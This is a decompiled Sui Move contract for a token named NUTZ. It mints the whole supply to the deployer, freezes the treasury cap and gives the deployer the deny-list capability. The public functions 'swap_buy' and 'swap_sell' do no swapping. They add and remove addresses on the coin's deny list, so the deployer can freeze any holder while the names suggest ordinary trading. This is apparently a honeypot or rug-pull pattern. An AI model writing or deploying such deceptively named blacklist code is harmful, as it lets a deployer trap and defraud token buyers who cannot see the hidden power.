module 0x11a69f9129bdba94075cb8f9bc6d9317e42064951777f60c1b51451d31c1090::nutz {
    struct NUTZ has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: NUTZ, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NUTZ>(arg0, 9, b"NUTZ", b"NUTZ", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmTcShp6xSqxCujJLzmAziPGQk3RaqXyYSgEE2qTTwz3UN"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NUTZ>(&mut v3, 420000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NUTZ>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NUTZ>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NUTZ>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NUTZ>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NUTZ>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NUTZ>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<NUTZ>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

